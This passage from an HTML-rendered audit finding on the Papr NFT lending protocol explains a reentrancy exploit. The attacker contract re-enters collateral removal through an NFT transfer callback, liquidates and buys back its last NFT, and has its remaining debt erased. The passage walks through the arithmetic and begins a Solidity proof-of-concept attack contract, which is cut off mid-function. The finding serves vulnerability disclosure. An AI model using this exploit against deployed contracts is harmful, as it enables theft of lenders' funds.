fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<ul>\n<li>Bob (a malicious user) deploys a contract to apply the attack. This contract is called <code>BobContract</code>. Please note that all the following transactions are going to be done in one transaction.</li>\n<li>BobContract takes a flash loan of 500K USDC.</li>\n<li>BobContract buys 10 NFTs with ids 1 to 10 from collection which are allowed to be used as collateral in this project. Suppose, each NFT has a price of almost 50K USDC.</li>\n<li>BobContract adds those NFTs as collateral by calling the function <code>addCollateral</code>. So <code>_vaultInfo[BobContract][collateral.addr].count = 10</code>.</li>\n</ul>\n<!---->\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"5\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function addCollateral(IPaprController.Collateral[] calldata collateralArr) external override {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        for (uint256 i = 0; i &lt; collateralArr.length;) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            _addCollateralToVault(msg.sender, collateralArr[i]);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            collateralArr[i].addr.transferFrom(msg.sender, address(this), collateralArr[i].id);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            unchecked {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                ++i;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p><a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L98\">https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L98</a></p>\n<ul>\n<li>BobContract borrows the max allowed amount of <code>PaprToken</code> that is almost equivalent to 250K USDC (for simplicity I am assuming target price and mark price are equal to 1 USDC. This assumption does not change the attack scenario at all. It is only to simplify the explanation). This amount is equal to 50% of the collateral amount. It can be done by calling the function <code>increaseDebt</code>.</li>\n</ul>\n<!---->\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"6\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function maxDebt(uint256 totalCollateraValue) external view override returns (uint256) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">       if (_lastUpdated == block.timestamp) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">           return _maxDebt(totalCollateraValue, _target);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">       }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">       return _maxDebt(totalCollateraValue, newTarget());</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">   }</span></span></code></pre>\n<p><a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L393\">https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L393</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"7\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function _maxDebt(uint256 totalCollateraValue, uint256 cachedTarget) internal view returns (uint256) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 maxLoanUnderlying = totalCollateraValue * maxLTV;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        return maxLoanUnderlying / cachedTarget;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p><a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L556\">https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L556</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"8\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function increaseDebt(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address mintTo,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        ERC721 asset,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 amount,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        ReservoirOracleUnderwriter.OracleInfo calldata oracleInfo</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) external override {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _increaseDebt({account: msg.sender, asset: asset, mintTo: mintTo, amount: amount, oracleInfo: oracleInfo});</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p><a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L138\">https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L138</a></p>\n<ul>\n<li>BobContract now has 10 NFTs as collateral (worth 500k) and borrowed 10<em>50k</em>50% = 250k.</li>\n<li>BobContract intends to call the function <code>removeCollateral</code>. (In the normal way of working with the protocol, this is not allowed, because by removing even 1 NFT, the debt 250k becomes larger than max allowed collateral 9<em>50k</em>50%).</li>\n</ul>\n<p><a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L109\">https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L109</a></p>\n<ul>\n<li>Here is the trick. BobContract calls this function to remove the NFT with id 1. During the removal in the function <code>_removeCollateral</code>, the <code>safeTransferFrom</code> callbacks the BobContract.</li>\n</ul>\n<p><a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L444\">https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L444</a></p>\n<p><a href=\"https://github.com/transmissions11/solmate/blob/3a752b8c83427ed1ea1df23f092ea7a810205b6c/src/tokens/ERC721.sol#L120\">https://github.com/transmissions11/solmate/blob/3a752b8c83427ed1ea1df23f092ea7a810205b6c/src/tokens/ERC721.sol#L120</a></p>\n<ul>\n<li>In the callback, BobContract calls this function again to remove the next NFT (I mean the NFT with id 2).</li>\n<li>BobContract repeats this for 9 NFTs. So, when all the NFTs with id 1 to 9 are removed from the protocol, in the last callback, BobContract calls the function <code>startLiquidationAuction</code> to put the NFT with id 10 on the auction. Please note that after removal of 9 NFTs, they are transferred to BobContract, and <code>_vaultInfo[BobContract][collateral.addr].count = 1</code>. So, BobContract health factor is not solvent any more because total debt is the same as before 250k, but max debt is now 1<em>50k</em>50% = 25k.</li>\n</ul>\n<p><a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L438\">https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L438</a></p>\n<p><a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L297\">https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L297</a></p>\n<ul>\n<li>After calling the function <code>startLiquidationAuction</code>, it checks whether the debt is larger than max debt or not. Since 9 NFTs were removed in the previous steps, <code>info.count = 1</code>, so debt is larger than max debt.</li>\n</ul>\n<!---->\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"9\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">if (info.debt &lt; _maxDebt(oraclePrice * info.count, cachedTarget)) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            revert IPaprController.NotLiquidatable();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span></code></pre>\n<p><a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L317\">https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L317</a></p>\n<ul>\n<li>Then, since this last NFT (with id 10) is going to be auctioned, the variable count will be decremented by one, so <code>_vaultInfo[msg.sender][collateral.addr].count = 0</code>. Moreover, the starting price for this NFT will be <code>3*oraclePrice</code> (because the <code>auctionStartPriceMultiplier = 3</code>), so it will be almost 3 * 50k = 150k.</li>\n</ul>\n<p><a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L326\">https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L326</a></p>\n<p><a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L341\">https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L341</a></p>\n<ul>\n<li>BobContract calls the function <code>purchaseLiquidationAuctionNFT</code> to buy it’s own NFT with id 10 which is priced at almost 150k.</li>\n</ul>\n<p><a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L264\">https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L264</a></p>\n<ul>\n<li>\n<p>In this function, we have the followoing variables:</p>\n<ul>\n<li><code>collateralValueCached</code> = 150k * 0 = 0</li>\n<li><code>isLastCollateral</code> = TRUE</li>\n<li><code>debtCached</code> = 250k (same as before)</li>\n<li><code>maxDebtCached</code> = 250k</li>\n<li><code>neededToSaveVault</code> = 0</li>\n<li><code>price</code> = 150k Please note that the functions <code>_purchaseNFTAndUpdateVaultIfNeeded</code> and <code>_purchaseNFT</code> are called that takes 150k from BobContract and transfers that last NFT with id 10 to BobContract.</li>\n</ul>\n</li>\n</ul>\n<p><a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L519\">https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L519</a></p>\n<p><a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/NFTEDA/NFTEDA.sol#L72\">https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/NFTEDA/NFTEDA.sol#L72</a></p>\n<ul>\n<li><code>excess</code> = 150k Since it is larger than zero, the function <code>_handleExcess</code> is called.</li>\n</ul>\n<p><a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L532\">https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L532</a></p>\n<ul>\n<li><code>fee</code> = 15k Considering 10% fee on the excess</li>\n<li><code>credit</code> = 135k</li>\n<li><code>totalOwed</code> = 135k Since this is smaller than <code>debtCaches</code> 250k, the function <code>_reduceDebt</code> is called to reduce debt from 250k to 115k.</li>\n</ul>\n<p><a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L549\">https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L549</a></p>\n<ul>\n<li><code>remaining</code> = 115k</li>\n<li>All the above calculations mean that the last NFT is sold at 150k, and 15k is considered as fee, so 135k will be deducted from the debt. Since the debt was 250k, 115k remains as debt.</li>\n<li>In the last part of the function <code>purchaseLiquidationAuctionNFT</code>, there is a check that makes the debt of BobContract equal to zero. This is the place that BobContract takes profit. It means that the debt of 115k is ignored.</li>\n</ul>\n<!---->\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"10\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">if (isLastCollateral &amp;&amp; remaining != 0) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            /// there will be debt left with no NFTs, set it to 0</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            _reduceDebtWithoutBurn(auction.nftOwner, auction.auctionAssetContract, remaining);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span></code></pre>\n<p><a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L290\">https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L290</a></p>\n<ul>\n<li>Now, the control returns back to the contract <code>PaprController</code>. So, it compares the debt and max for each collateral removal. Since the debt is set to zero in the previous steps, this check for all 10 NFTs will be passed.</li>\n</ul>\n<!---->\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"11\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">if (debt &gt; max) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            revert IPaprController.ExceedsMaxDebt(debt, max);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span></code></pre>\n<p><a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L449\">https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L449</a></p>\n<ul>\n<li>Now that the attack is finished, BobContract repays the flash loan after selling those 10 NFTs.</li>\n<li><strong><em>Bob had 250k that borrowed at first, then he paid 150k to buy his own NFT with id 10 on the auction, so Bob’s profit is equal to 100k. In summary, he could borrow 250k but only repaid 150k and received all his collateral.</em></strong></li>\n<li>Please note that taking a flash loan is not necessary, it is just to show that it can increase the attack impact much more.</li>\n<li>Please note that if Bob applies the same attack with only 3 NFTs (each worth 50k) and borrows 75k, he does not take any profit. Because, the last NFT should be bought 3 times the oracle price (3*50k = 150k) while the total debt was 75k.</li>\n<li><strong><em>In order to take profit and steal funds, the attacker at least should add 7 NFTs as collateral and borrow the max debt. Because <code>numberOfNFT * oraclePrice * 50% > oraclePrice * 3</code></em></strong></li>\n</ul>\n<p>In the following PoC, I am showing how the attack can be applied.</p>\n<p>Bob deploys the following contract and calls the function <code>attack()</code>. It takes flash loan from AAVE, then the callback from the AAVE will execute <code>executeOperation</code>. In this function, 10 NFTs with ids 1 to 10 are bought and added as collateral to the protocol.</p>\n<p>Then, it borrows max debt which is almost 250k, and remove the NFT with id 1.</p>\n<p>In the callback of <code>safeTransferFrom</code>, the function <code>onERC721Received</code> is called, if the number of callback is less than 9, it repeats removal of the NFTs with ids 2 to 9, respectively.</p>\n<p>When NFTs with id 9 is removed, the function <code>startLiquidationAuction</code> is called to auction NFT with id 10. Then, this NFT is purchased by BobContract immediately at the start price (which is defined by protocol to be 3 times larger than the oracle price). Then, after the control is returned to the protocol, BobContract sells these 10 NFTs and repays the flash loan.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"12\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">// SPDX-License-Identifier: MIT</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">pragma solidity 0.8.0;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">interface ERC721 {}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">interface ERC20 {}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">struct Collateral {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ERC721 addr;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 id;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">struct OracleInfo {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    Message message;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    Sig sig;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">struct Message {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    bytes32 id;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    bytes payload;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 timestamp;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    bytes signature;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">struct Sig {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint8 v;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    bytes32 r;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    bytes32 s;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">struct Auction {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address nftOwner;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 auctionAssetID;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ERC721 auctionAssetContract;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 perPeriodDecayPercentWad;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 secondsInPeriod;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 startPrice;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ERC20 paymentAsset;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">enum PriceKind {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    SPOT,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    TWAP,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    LOWER,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    UPPER</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">interface IPaprController {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function addCollateral(Collateral[] calldata collateral) external;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function increaseDebt(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address mintTo,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        ERC721 asset,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 amount,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        OracleInfo calldata oracleInfo</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) external;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function removeCollateral(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address sendTo,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        Collateral[] calldata collateralArr,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        OracleInfo calldata oracleInfo</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) external;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function startLiquidationAuction(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address account,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        Collateral calldata collateral,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        OracleInfo calldata oracleInfo</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) external returns (Auction memory auction);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function purchaseLiquidationAuctionNFT(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        Auction calldata auction,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 maxPrice,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address sendTo,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        OracleInfo calldata oracleInfo</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) external;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function maxDebt(uint256 totalCollateraValue)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        external</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        view</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        returns (uint256);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function underwritePriceForCollateral(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        ERC721 asset,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        PriceKind priceKind,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        OracleInfo memory oracleInfo</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) external returns (uint256);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">interface IFundingRateController {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function updateTarget() external returns (uint256);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">interface IAAVE {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function flashLoanSimple(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address receiverAddress,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address asset,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 amount,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bytes calldata params,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint16 referralCode</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) external;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">contract BobContract {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    IPaprController iPaprController;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    IFundingRateController iFundingRateController;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    IAAVE iAAVE;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ERC721 nftCollectionAddress;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ERC20 paprToken;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    Collateral[] collaterals;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    OracleInfo oracleInfo;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 numOfCallback;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    constructor(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address _paprControllerAddress,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address _fundingRateControllerAddress,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address _aaveAddress,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        ERC721 _nftCollectionAddress,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        OracleInfo memory _oracleInfo,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        ERC20 _paprToken</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        iPaprController = IPaprController(_paprControllerAddress);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        iFundingRateController = IFundingRateController(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            _fundingRateControllerAddress</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        iAAVE = IAAVE(_aaveAddress);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        nftCollectionAddress = _nftCollectionAddress;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        oracleInfo = _oracleInfo;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        paprToken = _paprToken;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function attack() public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        ///// STEP1: taking flash loan</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        iAAVE.flashLoanSimple(address(this), USDC, 10 * 50000 * 10**6, &quot;&quot;, 0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function executeOperation(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address[] calldata assets,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256[] calldata amounts,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256[] calldata premiums,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address initiator,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bytes calldata params</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) external returns (bool) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        ///// STEP2: buying 10 NFTs</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Buy 10 NFTs that each worths almost 50k</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Assume the ids are from 1 to 10</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        ///// STEP3: adding the NFTs as collateral</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        for (uint256 i = 0; i &lt; 10; ++i) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            collaterals.push(Collateral({addr: nftCollectionAddress, id: i}));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        iPaprController.addCollateral(collaterals);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        ///// STEP4: borrowing as much as possible</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 oraclePrice = iPaprController.underwritePriceForCollateral(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            nftCollectionAddress,</span></span>\n<span 